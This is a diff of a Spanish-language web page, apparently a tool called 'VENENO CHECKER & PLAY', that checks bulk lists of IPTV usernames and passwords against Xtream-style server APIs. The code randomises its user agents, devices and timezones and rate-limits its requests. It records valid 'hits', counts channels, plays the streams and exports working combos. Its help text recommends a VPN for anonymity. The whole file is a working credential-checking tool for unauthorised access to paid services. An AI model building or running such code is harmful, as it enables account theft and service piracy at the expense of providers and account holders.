+let lastReset = Date.now();
+
+document.getElementById('btnScan').onclick = () => {
+    if(isScanning) return;
+    const raw = UI.bulk.value;
+    
+    // Limpiar la lista antes de escanear
+    const cleaned = cleanM3UList(raw);
+    if(cleaned.length === 0) {
+        log("No se encontraron URLs válidas después de limpiar.", "error");
+        showNotification("No hay URLs válidas para escanear", 'error');
+        return;
+    }
+    
+    const urls = cleaned;
+    
+    const unique = [...new Set(urls.map(u => u.replace(/['",]/g, '').trim()))];
+    queue = unique.map((u,i)=>({url:u, id:i}));
+    total = queue.length; done = 0; active = 0;
+
+    isScanning=true; isPaused=false; abortScan=false;
+    document.getElementById('btnScan').disabled=true;
+    document.getElementById('btnPause').disabled=false;
+    document.getElementById('btnStop').disabled=false;
+    
+    setStatus('run', 'EJECUTANDO');
+    countOnline=0; countOffline=0; countTotal=total;
+    UI.on.textContent="0"; UI.off.textContent="0"; UI.total.textContent=total;
+
+    log(`Escaneando ${total} objetivos...`, "warn");
+    showNotification(`Iniciando escaneo de ${total} servidores`, 'info');
+    heartbeat.postMessage('start');
+    updateChart(0, 0);
+};
+
+heartbeat.onmessage = () => {
+    if(!isScanning) return;
+    
+    // Rate limiting
+    if(Date.now() - lastReset > 1000) {
+        requestCount = 0;
+        lastReset = Date.now();
+    }
+    
+    if(requestCount >= 20) return;
+    
+    if(abortScan || (queue.length===0 && active===0)) { finish(); return; }
+    if(isPaused) return;
+
+    const max = parseInt(document.getElementById('threadInput').value);
+    while(active < max && queue.length > 0 && !abortScan && !isPaused && requestCount < 20) {
+        const task = queue.shift();
+        active++;
+        requestCount++;
+        check(task).finally(()=>{
+            active--; done++;
+            const pct = ((done/total)*100).toFixed(1);
+            UI.fill.style.width=pct+"%"; UI.text.textContent=`${done}/${total} (${pct}%)`;
+        });
+    }
+};
+
+async function check(task) {
+    try {
+        const u = new URL(task.url);
+        const port = u.port || "80";
+        const host = `${u.protocol}//${u.hostname}:${port}`;
+        
+        // Extraer usuario y contraseña de diferentes formatos
+        let user = u.searchParams.get('username') || u.searchParams.get('user');
+        let pass = u.searchParams.get('password') || u.searchParams.get('pass') || u.searchParams.get('pwd');
+        
+        // Si no están en los parámetros, verificar en la ruta
+        if(!user || !pass) {
+            const pathParts = u.pathname.split('/');
+            const liveIndex = pathParts.indexOf('live');
+            if(liveIndex !== -1 && pathParts.length > liveIndex + 2) {
+                user = pathParts[liveIndex + 1];
+                pass = pathParts[liveIndex + 2];
+            }
+        }
+        
+        if(!user || !pass) throw Error("Sin credenciales");
+
+        const timeout = parseInt(document.getElementById('timeoutInput').value);
+        const ctl = new AbortController();
+        const to = setTimeout(()=>ctl.abort(), timeout); 
+
+        const agent = encodeURIComponent(getRandomItem(USER_AGENTS));
+        const dev = encodeURIComponent(getRandomItem(DEVICES));
+        const tz = encodeURIComponent(getRandomItem(TIMEZONES));
+        const api = `${host}/player_api.php?username=${user}&password=${pass}&u=${agent}&d=${dev}&z=${tz}`;
+
+        const r = await fetch(api, { signal: ctl.signal });
+        clearTimeout(to);
+        const j = await r.json();
+
+        if(j.user_info && j.user_info.auth === 1) {
+            const expTimestamp = j.user_info.exp_date;
+            if(expTimestamp && expTimestamp != "0" && expTimestamp != null) {
+                const now = Math.floor(Date.now() / 1000);
+                if(parseInt(expTimestamp) < now) {
+                    throw new Error("Expirado");
+                }
+            }
+
+            let serverInfo = { country: "Desconocido", city: "Desconocido", isp: "Desconocido", ip: "Desconocido", cc: "" };
+            try {
+                const geoData = await detectCountryWithFallback(u.hostname);
+                serverInfo = {
+                    country: geoData.country,
+                    city: geoData.city,
+                    isp: geoData.isp,
+                    ip: geoData.ip || u.hostname,
+                    cc: geoData.code
+                };
+            } catch(e) {
+                console.error("Error en geolocalización:", e);
+            }
+
+            // Filtro por país
+            const selectedCountry = document.getElementById('countryFilter').value;
+            if(selectedCountry !== 'all' && serverInfo.cc !== selectedCountry) {
+                countOffline++; UI.off.textContent = countOffline;
+                log(`${task.url} | Fuera del país filtrado (${selectedCountry})`, "error", "FILTRADO");
+                updateChart(countOnline, countOffline);
+                return;
+            }
+
+            countOnline++; UI.on.textContent=countOnline;
+            
+            const countIds = async (action, key) => {
+                try {
+                    const txt = await (await fetch(`${api}&action=${action}`)).text();
+                    return (txt.match(new RegExp(key, "g")) || []).length;
+                } catch { return 0; }
+            };
+            const fetchCats = async (action) => {
+                try { return await (await fetch(`${api}&action=${action}`)).json(); } catch{ return []; }
+            };
+
+            const [lCats, vCats, sCats, lCount, vCount, sCount] = await Promise.all([
+                fetchCats('get_live_categories'),
+                fetchCats('get_vod_categories'),
+                fetchCats('get_series_categories'),
+                countIds('get_live_streams', 'stream_id'),
+                countIds('get_vod_streams', 'stream_id'),
+                countIds('get_series', 'series_id')
+            ]);
+
+            const hitData = {
+                urlObj: u, host: host, user, pass, api, info: j.user_info, server: j.server_info, geo: serverInfo,
+                counts: { 
+                    live: lCount, vod: vCount, series: sCount,
+                    live_cats: Array.isArray(lCats)?lCats.length:0,
+                    vod_cats: Array.isArray(vCats)?vCats.length:0,
+                    series_cats: Array.isArray(sCats)?sCats.length:0
+                },
+                cats: { live: lCats, vod: vCats, series: sCats }
+            };
+            globalHits.push(hitData);
+
+            const exp = j.user_info.exp_date ? new Date(j.user_info.exp_date*1000).toLocaleDateString() : "Ilimitado";
+            const activeConnections = j.user_info.active_cons || 0;
+            const maxConnections = j.user_info.max_connections || 1;
+            
+            // MODIFICACIÓN: Añadir conexiones activas/máximas y país al log
+            log(`${host} | Exp: ${exp} | Conexiones: ${activeConnections}/${maxConnections} | País: ${serverInfo.country}`, "success", "ONLINE", {
+                onclick: `browser.init('${encodeURIComponent(api)}', '${host}', '${user}', '${pass}')`
+            });
+            updateChart(countOnline, countOffline);
+
+        } else { throw Error("Error de autenticación"); }
+
+    } catch(e) {
+        countOffline++; UI.off.textContent=countOffline;
+        let badge = "OFFLINE";
+        if(e.message === "Expirado") badge = "EXPIRADO";
+        else if(e.message === "Sin credenciales") badge = "SIN CRED";
+        else if(e.message === "Error de autenticación") badge = "ERROR AUTH";
+        log(`${task.url} - ${e.message}`, "error", badge);
+        updateChart(countOnline, countOffline);
+    }
+}
+
+function finish() {
+    isScanning=false; heartbeat.postMessage('stop');
+    document.getElementById('btnScan').disabled=false;
+    document.getElementById('btnPause').disabled=true;
+    document.getElementById('btnStop').disabled=true;
+    
+    setStatus('stop', abortScan ? "DETENIDO" : "FINALIZADO");
+    log(`Escaneo completado. Resultados: ${countOnline}/${countTotal}`, abortScan?"error":"success");
+    showNotification(`Escaneo completado: ${countOnline}/${countTotal} servidores online`, abortScan ? 'error' : 'success');
+    updateResultsTable();
+}
+
+// ==================== GRÁFICO ====================
+function updateChart(online, offline) {
+    const ctx = document.getElementById('statsChart').getContext('2d');
+    
+    if(statsChart) {
+        statsChart.destroy();
+    }
+    
+    statsChart = new Chart(ctx, {
+        type: 'doughnut',
+        data: {
+            labels: ['ONLINE', 'OFFLINE', 'PENDIENTE'],
+            datasets: [{
+                data: [online, offline, total - done],
+                backgroundColor: ['#39ff14', '#ff003c', '#6fe7ff'],
+                borderWidth: 2,
+                borderColor: '#020b14'
+            }]
+        },
+        options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: {
+                legend: {
+                    labels: {
+                        color: '#fff',
+                        font: {
+                            family: "'Share Tech Mono', monospace",
+                            size: 11
+                        }
+                    }
+                },
+                tooltip: {
+                    callbacks: {
+                        label: function(context) {
+                            let label = context.label || '';
+                            if (label) {
+                                label += ': ';
+                            }
+                            label += context.parsed;
+                            return label;
+                        }
+                    }
+                }
+            }
+        }
+    });
+}
+
+// ==================== FILTRO LOG ====================
+function filterLog(type) {
+    const lines = document.querySelectorAll('.log-line');
+    const filters = document.querySelectorAll('.log-filter');
+    filters.forEach(f => f.classList.remove('active'));
+    
+    switch(type) {
+        case 'all':
+            document.getElementById('filterAll').classList.add('active');
+            lines.forEach(line => line.style.display = 'flex');
+            break;
+        case 'online':
+            document.getElementById('filterOnline').classList.add('active');
+            lines.forEach(line => {
+                line.style.display = line.dataset.badge === 'ONLINE' ? 'flex' : 'none';
+            });
+            break;
+        case 'offline':
+            document.getElementById('filterOffline').classList.add('active');
+            lines.forEach(line => {
+                line.style.display = (line.dataset.badge === 'OFFLINE' || line.dataset.badge === 'EXPIRADO' || line.dataset.badge === 'FILTRADO') ? 'flex' : 'none';
+            });
+            break;
+        case 'error':
+            document.getElementById('filterError').classList.add('active');
+            lines.forEach(line => {
+                line.style.display = line.dataset.type === 'error' ? 'flex' : 'none';
+            });
+            break;
+    }
+}
+
+// ==================== REPRODUCTOR ====================
+const browser = {
+    api: null,
+    host: null,
+    user: null,
+    pass: null,
+    type: 'live',
+    hlsInstance: null,
+    
+    init: function(api, h, u, p) {
+        this.api = decodeURIComponent(api);
+        this.host = h;
+        this.user = u;
+        this.pass = p;
+        
+        document.getElementById('videoOverlay').innerHTML = `
+            <div style="text-align: center; padding: 20px;">
+                <div style="font-size: 24px; margin-bottom: 10px;">📡</div>
+                <div style="font-size: 16px; margin-bottom: 10px;">CONEXIÓN ESTABLECIDA</div>
+                <div style="font-size: 12px; color: #39ff14; margin-top: 10px;">${h}</div>
+                <div style="font-size: 12px; color: #888;">Selecciona una categoría para empezar</div>
             </div>
         `;
-
-        E('results').prepend(el);
+        document.getElementById('videoOverlay').style.display = 'block';
+        
+        this.loadType('live', document.querySelector('.tab-btn.active'));
+    },
+    
+    loadType: async function(t, btn) {
+        this.type = t;
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        if (btn) btn.classList.add('active');
+        
+        const list = document.getElementById('browserList');
+        document.getElementById('browserBack').style.display = 'none';
+        list.innerHTML = '<div style="padding:20px;text-align:center;color:#39ff14">Cargando categorías...</div>';
+        
+        let action = t === 'live' ? 'get_live_categories' : t === 'vod' ? 'get_vod_categories' : 'get_series_categories';
+        
+        try {
+            const response = await fetch(`${this.api}&action=${action}`);
+            if (!response.ok) throw new Error('Error en la respuesta');
+            
+            const categories = await response.json();
+            list.innerHTML = '';
+            
+            if (!categories || !categories.length) {
+                list.innerHTML = '<div style="padding:20px;text-align:center;color:#888">No hay categorías disponibles</div>';
+                return;
+            }
+            
+            categories.forEach(cat => {
+                const el = document.createElement('div');
+                el.className = 'list-item is-cat';
+                el.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-weight: bold;">📺 ${cat.category_name}</span>
+                        <span style="font-size: 10px; color: #39ff14;">ID: ${cat.category_id}</span>
+                    </div>
+                `;
+                el.onclick = () => this.loadStreams(cat.category_id, cat.category_name);
+                list.appendChild(el);
+            });
+        } catch (error) {
+            list.innerHTML = `<div style="padding:20px;text-align:center;color:#ff003c">Error: ${error.message}</div>`;
+        }
+    },
+    
+    loadStreams: async function(categoryId, categoryName) {
+        const list = document.getElementById('browserList');
+        document.getElementById('browserBack').style.display = 'block';
+        document.getElementById('browserBack').onclick = () => this.loadType(this.type);
+        document.getElementById('browserBack').innerHTML = `&laquo; Volver a ${this.type === 'live' ? 'Canales' : this.type === 'vod' ? 'Películas' : 'Series'}`;
+        
+        list.innerHTML = '<div style="padding:20px;text-align:center;color:#39ff14">Cargando contenido...</div>';
+        
+        let action = this.type === 'live' ? 'get_live_streams' : this.type === 'vod' ? 'get_vod_streams' : 'get_series';
+        
+        try {
+            const response = await fetch(`${this.api}&action=${action}&category_id=${categoryId}`);
+            if (!response.ok) throw new Error('Error en la respuesta');
+            
+            const streams = await response.json();
+            list.innerHTML = '';
+            
+            if (!streams || !streams.length) {
+                list.innerHTML = '<div style="padding:20px;text-align:center;color:#888">No hay contenido en esta categoría</div>';
+                return;
+            }
+            
+            // Ordenar alfabéticamente
+            streams.sort((a, b) => a.name.localeCompare(b.name));
+            
+            streams.forEach(stream => {
+                const el = document.createElement('div');
+                el.className = 'list-item';
+                
+                const streamName = stream.name || `Stream ${stream.stream_id || stream.series_id}`;
+                const streamId = stream.stream_id || stream.series_id;
+                
+                el.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
+                        <span style="flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${streamName}</span>
+                        <span style="font-size: 10px; color: #39ff14; margin-left: 10px;">
+                            ▶️
+                        </span>
+                    </div>
+                `;
+                
+                el.onclick = () => {
+                    // Marcar como seleccionado
+                    document.querySelectorAll('.list-item').forEach(item => item.style.background = '');
+                    el.style.background = 'rgba(57, 255, 20, 0.1)';
+                    
+                    // Obtener extensión (priorizar m3u8, luego ts, luego mp4)
+                    const ext = stream.container_extension || 
+                               (this.type === 'live' ? 'm3u8' : 'mp4');
+                    
+                    this.playStream(streamId, ext, streamName);
+                };
+                
+                list.appendChild(el);
+            });
+        } catch (error) {
+            list.innerHTML = `<div style="padding:20px;text-align:center;color:#ff003c">Error: ${error.message}</div>`;
+        }
+    },
+    
+    playStream: function(streamId, ext, streamName) {
+        const video = document.getElementById('videoPlayer');
+        const overlay = document.getElementById('videoOverlay');
+        
+        // Detener reproducción anterior
+        video.pause();
+        video.src = '';
+        
+        // Limpiar HLS anterior
+        if (this.hlsInstance) {
+            this.hlsInstance.destroy();
+            this.hlsInstance = null;
+        }
+        
+        // Mostrar mensaje de carga
+        overlay.innerHTML = `
+            <div style="text-align: center; padding: 20px;">
+                <div style="font-size: 24px; margin-bottom: 10px;">📡</div>
+                <div style="font-size: 16px; margin-bottom: 5px;">CARGANDO</div>
+                <div style="font-size: 14px; margin-bottom: 10px; color: #39ff14;">${streamName}</div>
+                <div class="loader" style="width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #39ff14; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                <div style="font-size: 12px; color: #888; margin-top: 10px;">Preparando stream...</div>
+            </div>
+        `;
+        overlay.style.display = 'block';
+        
+        // Generar URL de stream
+        const streamUrl = this.generateStreamUrl(streamId, ext);
+        console.log('URL del stream:', streamUrl);
+        
+        // Intentar reproducir
+        this.tryToPlay(video, overlay, streamUrl, streamName);
+    },
+    
+    generateStreamUrl: function(streamId, ext) {
+        // FORMATOS CORREGIDOS - Los más comunes en servidores IPTV
+        const baseUrl = this.host;
+        const user = this.user;
+        const pass = this.pass;
+        
+        // Lista de formatos posibles (ordenados por probabilidad de éxito)
+        const urlFormats = [
+            // Formato 1: El más común
+            `${baseUrl}/live/${user}/${pass}/${streamId}.${ext}`,
+            
+            // Formato 2: Alternativo común
+            `${baseUrl}/${user}/${pass}/${streamId}`,
+            
+            // Formato 3: Con parámetros GET
+            `${baseUrl}/get.php?username=${user}&password=${pass}&type=m3u_plus&output=ts&stream_id=${streamId}`,
+            
+            // Formato 4: Para VOD/Series
+            `${baseUrl}/movie/${user}/${pass}/${streamId}.${ext}`,
+            `${baseUrl}/series/${user}/${pass}/${streamId}.${ext}`,
+            
+            // Formato 5: Sin extensión
+            `${baseUrl}/live/${user}/${pass}/${streamId}`,
+            
+            // Formato 6: Con .ts
+            `${baseUrl}/live/${user}/${pass}/${streamId}.ts`,
+            
+            // Formato 7: Con .m3u8
+            `${baseUrl}/live/${user}/${pass}/${streamId}.m3u8`
+        ];
+        
+        // Devolver el primer formato (el más común)
+        return urlFormats[0];
+    },
+    
+    tryToPlay: function(video, overlay, streamUrl, streamName) {
+        // Configurar eventos del video
+        video.onerror = () => {
+            overlay.innerHTML = `
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 24px; margin-bottom: 10px;">❌</div>
+                    <div style="font-size: 16px; margin-bottom: 5px;">ERROR DE REPRODUCCIÓN</div>
+                    <div style="font-size: 14px; margin-bottom: 10px; color: #ff003c;">No se pudo cargar el stream</div>
+                    <div style="font-size: 12px; color: #888; margin-top: 10px;">URL: ${streamUrl.substring(0, 50)}...</div>
+                </div>
+            `;
+            log(`Error reproduciendo: ${streamName}`, "error");
+            showNotification(`Error reproduciendo: ${streamName}`, 'error');
+        };
+        
+        video.onloadeddata = () => {
+            overlay.style.display = 'none';
+            log(`Reproduciendo: ${streamName}`, "success");
+            showNotification(`Reproduciendo: ${streamName}`, 'success');
+        };
+        
+        video.onwaiting = () => {
+            overlay.innerHTML = `
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 24px; margin-bottom: 10px;">⏳</div>
+                    <div style="font-size: 16px; margin-bottom: 5px;">BUFFERING...</div>
+                    <div class="loader" style="width: 30px; height: 30px; border: 3px solid #333; border-top: 3px solid #39ff14; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
+                </div>
+            `;
+            overlay.style.display = 'block';
+        };
+        
+        video.onplaying = () => {
+            overlay.style.display = 'none';
+        };
+        
+        // Verificar si es HLS (m3u8)
+        if (streamUrl.includes('.m3u8') || streamUrl.includes('m3u_plus')) {
+            this.playWithHLS(video, overlay, streamUrl, streamName);
+        } else {
+            // Reproducción directa
+            video.src = streamUrl;
+            video.load();
+            
+            // Intentar reproducir después de un breve delay
+            setTimeout(() => {
+                video.play().catch(e => {
+                    overlay.innerHTML = `
+                        <div style="text-align: center; padding: 20px;">
+                            <div style="font-size: 24px; margin-bottom: 10px;">▶️</div>
+                            <div style="font-size: 14px; margin-bottom: 5px;">CLICK PARA REPRODUCIR</div>
+                            <div style="font-size: 12px; color: #888;">El navegador requiere interacción manual</div>
+                        </div>
+                    `;
+                    overlay.onclick = () => {
+                        video.play();
+                        overlay.style.display = 'none';
+                    };
+                });
+            }, 500);
+        }
+    },
+    
+    playWithHLS: function(video, overlay, streamUrl, streamName) {
+        if (Hls && Hls.isSupported()) {
+            const hls = new Hls({
+                enableWorker: true,
+                lowLatencyMode: true,
+                backBufferLength: 90,
+                maxBufferLength: 30,
+                maxBufferSize: 60 * 1000 * 1000,
+                manifestLoadingTimeOut: 10000,
+                manifestLoadingMaxRetry: 3,
+                levelLoadingTimeOut: 10000,
+                levelLoadingMaxRetry: 4,
+                fragLoadingTimeOut: 20000,
+                fragLoadingMaxRetry: 6,
+                startFragPrefetch: true,
+                capLevelToPlayerSize: true,
+                autoStartLoad: true
+            });
+            
+            this.hlsInstance = hls;
+            
+            hls.on(Hls.Events.MANIFEST_PARSED, () => {
+                overlay.style.display = 'none';
+                video.play().then(() => {
+                    log(`Reproduciendo HLS: ${streamName}`, "success");
+                }).catch(e => {
+                    overlay.innerHTML = `
+                        <div style="text-align: center; padding: 20px;">
+                            <div style="font-size: 24px; margin-bottom: 10px;">▶️</div>
+                            <div style="font-size: 14px; margin-bottom: 5px;">CLICK PARA REPRODUCIR</div>
+                            <div style="font-size: 12px; color: #888;">El navegador requiere interacción manual</div>
+                        </div>
+                    `;
+                    overlay.onclick = () => {
+                        video.play();
+                        overlay.style.display = 'none';
+                    };
+                });
+            });
+            
+            hls.on(Hls.Events.ERROR, (event, data) => {
+                console.error("Error HLS:", data);
+                
+                if (data.fatal) {
+                    switch (data.type) {
+                        case Hls.ErrorTypes.NETWORK_ERROR:
+                            // Intentar recuperar
+                            hls.startLoad();
+                            break;
+                        case Hls.ErrorTypes.MEDIA_ERROR:
+                            hls.recoverMediaError();
+                            break;
+                        default:
+                            // Error fatal, intentar reproducción directa
+                            hls.destroy();
+                            this.hlsInstance = null;
+                            video.src = streamUrl.replace('.m3u8', '.ts').replace('m3u_plus', 'ts');
+                            video.load();
+                            video.play().catch(() => {
+                                overlay.innerHTML = `
+                                    <div style="text-align: center; padding: 20px;">
+                                        <div style="font-size: 24px; margin-bottom: 10px;">❌</div>
+                                        <div style="font-size: 16px; margin-bottom: 5px;">ERROR HLS</div>
+                                        <div style="font-size: 12px; color: #888;">Intentando formato alternativo...</div>
+                                    </div>
+                                `;
+                            });
+                            break;
+                    }
+                }
+            });
+            
+            hls.loadSource(streamUrl);
+            hls.attachMedia(video);
+            
+        } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
+            // Safari soporta HLS nativamente
+            video.src = streamUrl;
+            video.load();
+            video.play().then(() => {
+                overlay.style.display = 'none';
+                log(`Reproduciendo HLS nativo: ${streamName}`, "success");
+            }).catch(e => {
+                overlay.innerHTML = `
+                    <div style="text-align: center; padding: 20px;">
+                        <div style="font-size: 24px; margin-bottom: 10px;">▶️</div>
+                        <div style="font-size: 14px; margin-bottom: 5px;">CLICK PARA REPRODUCIR</div>
+                        <div style="font-size: 12px; color: #888;">El navegador requiere interacción manual</div>
+                    </div>
+                `;
+                overlay.onclick = () => {
+                    video.play();
+                    overlay.style.display = 'none';
+                };
+            });
+        } else {
+            overlay.innerHTML = `
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 24px; margin-bottom: 10px;">⚠️</div>
+                    <div style="font-size: 16px; margin-bottom: 5px;">NAVEGADOR NO COMPATIBLE</div>
+                    <div style="font-size: 12px; color: #888;">HLS no es soportado en este navegador</div>
+                </div>
+            `;
+        }
+    },
+    
+    // Controles de reproducción
+    controls: {
+        toggleFullscreen: function() {
+            const video = document.getElementById('videoPlayer');
+            const container = document.querySelector('.video-wrapper');
+            
+            if (!document.fullscreenElement) {
+                if (container.requestFullscreen) {
+                    container.requestFullscreen();
+                } else if (container.webkitRequestFullscreen) {
+                    container.webkitRequestFullscreen();
+                } else if (container.mozRequestFullScreen) {
+                    container.mozRequestFullScreen();
+                } else if (container.msRequestFullscreen) {
+                    container.msRequestFullscreen();
+                }
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                } else if (document.mozCancelFullScreen) {
+                    document.mozCancelFullScreen();
+                } else if (document.msExitFullscreen) {
+                    document.msExitFullscreen();
+                }
+            }
+        },
+        
+        takeScreenshot: function() {
+            const video = document.getElementById('videoPlayer');
+            if (video.readyState < 2) {
+                log("El video no está listo para capturar", "error");
+                showNotification("El video no está listo para capturar", 'warning');
+                return;
+            }
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Añadir marca de agua
+            ctx.fillStyle = 'rgba(57, 255, 20, 0.7)';
+            ctx.font = '16px Share Tech Mono';
+            ctx.fillText('VENENO CHECKER & PLAY', 10, canvas.height - 20);
+            ctx.fillText(new Date().toLocaleString(), 10, canvas.height - 40);
+            
+            const link = document.createElement('a');
+            link.download = `veneno_screenshot_${Date.now()}.png`;
+            link.href = canvas.toDataURL('image/png');
+            link.click();
+            log("Captura de pantalla guardada", "success");
+            showNotification("Captura de pantalla guardada", 'success');
+        },
+        
+        setSpeed: function(speed) {
+            const video = document.getElementById('videoPlayer');
+            video.playbackRate = speed;
+            log(`Velocidad establecida: ${speed}x`, "info");
+            showNotification(`Velocidad establecida: ${speed}x`, 'info');
+        }
     }
+};
 
-    function saveHits() {
-        if (!S.data.length) return alert('No hay hits para guardar.');
+// ==================== HELP MODAL ====================
+function showHelp() {
+    const helpHTML = `
+    <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:10000; display:flex; align-items:center; justify-content:center;">
+        <div style="background:var(--panel); padding:30px; border:2px solid var(--neon); max-width:600px; max-height:80vh; overflow:auto; border-radius:8px;">
+            <h2 style="color:var(--neon); margin-bottom:20px; text-align:center;">☠️ GUÍA DE USO - VENENO CHECKER & PLAY v2.1</h2>
+            <div style="color:#ccc; line-height:1.6; font-size:13px;">
+                <h3>📌 NUEVAS FUNCIONALIDADES v2.1:</h3>
+                <p><strong>🧹 LIMPIAR LISTA:</strong> Extrae URLs válidas de texto con "morralla"</p>
+                <p><strong>🔧 EXTRAER COMBOS:</strong> Convierte formatos host|user|pass a URLs M3U</p>
+                <p><strong>📺 M3U COMPLETO:</strong> Exporta lista M3U con todos los canales reales</p>
+                <p><strong>🧪 TEST REPRODUCCIÓN:</strong> Prueba si los servidores funcionan</p>
+                
+                <h3>📌 CÓMO USAR:</h3>
+                <p>1. Pega tus enlaces en el área de texto (acepta múltiples formatos)</p>
+                <p>2. Usa LIMPIAR LISTA para extraer solo URLs válidas</p>
+                <p>3. Usa EXTRAER COMBOS para convertir host|user|pass a URLs</p>
+                <p>4. Configura threads (10-20 recomendado) y timeout</p>
+                <p>5. Filtra por país si lo deseas</p>
+                <p>6. Haz clic en INICIAR ESCANEO</p>
+                <p>7. Los resultados ONLINE aparecerán en el log</p>
+                <p>8. Usa el reproductor para probar los canales</p>
+                <p>9. Exporta en diferentes formatos usando el selector</p>
+                
+                <h3>⚙️ FORMATOS DE ENTRADA ACEPTADOS:</h3>
+                <p>• URL completa: http://server.com/get.php?username=X&password=X</p>
+                <p>• Combo: server.com:8080|user123|pass456</p>
+                <p>• Combo con @: user:pass@server.com</p>
+                <p>• Ruta: http://server.com/live/user/pass/123.ts</p>
+                <p>• M3U directo: http://server.com/playlist.m3u</p>
+                
+                <h3>🎬 REPRODUCTOR MEJORADO:</h3>
+                <p>• Intenta automáticamente múltiples formatos de stream</p>
+                <p>• Soporte HLS nativo y con HLS.js</p>
+                <p>• Captura de pantalla con marca de agua</p>
+                <p>• Control de velocidad de reproducción</p>
+                <p>• Pantalla completa</p>
+                
+                <h3>📊 EXPORTACIÓN MEJORADA:</h3>
+                <p>• <strong>TXT DETALLADO:</strong> Formato completo con conexiones activas/máximas</p>
+                <p>• <strong>M3U BÁSICO:</strong> Lista simple de servidores</p>
+                <p>• <strong>M3U COMPLETO:</strong> Descarga canales reales (puede tardar)</p>
+                <p>• <strong>JSON:</strong> Datos estructurados</p>
+                <p>• <strong>CSV:</strong> Para hojas de cálculo</p>
+                <p>• <strong>COMBOS:</strong> Exporta en formato host|user|pass</p>
+                
+                <h3>⚠️ NOTAS IMPORTANTES:</h3>
+                <p>• Usa una VPN para mejor rendimiento y anonimato</p>
+                <p>• M3U COMPLETO puede tardar dependiendo de los servidores</p>
+                <p>• El reproductor intenta automáticamente múltiples formatos</p>
+                <p>• Los resultados se guardan solo en esta sesión</p>
+                <p>• v2.1 incluye mejor detección de país con múltiples servicios</p>
+            </div>
+            <button onclick="this.parentElement.parentElement.remove()" style="margin-top:20px; padding:10px 20px; background:var(--neon); color:#000; border:none; cursor:pointer; width:100%; font-weight:bold;">CERRAR</button>
+        </div>
+    </div>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', helpHTML);
+}
 
-        const uniqueHosts = [...new Set(S.data.map(d => d.host))];
-        const ts = Date.now();
-
-        uniqueHosts.forEach((host, idx) => {
-            const dataForHost = S.data.filter(d => d.host === host);
-            if (!dataForHost.length) return;
-
-            const safeHost = host.replace(/[^a-zA-Z0-9]/g, '_').substring(0,25);
-            const filename = `JJAVIER_HITS_${safeHost || `Host${idx+1}`}_${ts}.txt`;
-
-            const content = dataForHost.map(d => {
-                const m3u    = `${d.host}/get.php?username=${d.username}&password=${d.password}&type=m3u_plus`;
-                const m3u_ts = `${d.host}:80/get.php?username=${d.username}&password=${d.password}&type=m3u_plus&output=ts`;
-                const epg    = `${d.host}/xmltv.php?username=${d.username}&password=${d.password}`;
-
-                return `\n\n` +
-                `╔════════════════════════════════════╗\n` +
-                `║        JJAVIER ULTRA BRUTAL        ║\n` +
-                `╚════════════════════════════════════╝\n` +
-                `HOST:      ${d.host}\n` +
-                `USUARIO:   ${d.username}\n` +
-                `CONTRASEÑA: ${d.password}\n` +
-                `\n` +
-                `CADUCIDAD: ${d.expires}\n` +
-                `MÁX CONEXIONES: ${d.maxconn}\n` +
-                `\n` +
-                `LIVE:  ${d.stats.live}\n` +
-                `VOD:   ${d.stats.vod}\n` +
-                `SERIES: ${d.stats.series}\n` +
-                `\n` +
-                `M3U:     ${m3u}\n` +
-                `M3U8 TS: ${m3u_ts}\n` +
-                `EPG:     ${epg}\n` +
-                `══════════════════════════════════════\n`;
-            }).join('');
-
-            const blob = new Blob([content], {type: 'text/plain'});
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            a.click();
-            URL.revokeObjectURL(url);
-        });
-
-        alert(`¡Se generaron ${uniqueHosts.length} archivo(s) con los hits!`);
-    }
+// ==================== INICIALIZACIÓN ====================
+document.addEventListener('DOMContentLoaded', function() {
+    initParticles();
+    showNotification('VENENO CHECKER & PLAY v2.1 MEJORADO cargado correctamente', 'success');
+    log("VENENO CHECKER & PLAY v2.1 MEJORADO inicializado", "success");
+    log("Nuevas funciones: Limpieza de listas, Extracción de combos, M3U completo", "info");
+});
 </script>
-
 </body>
 </html>
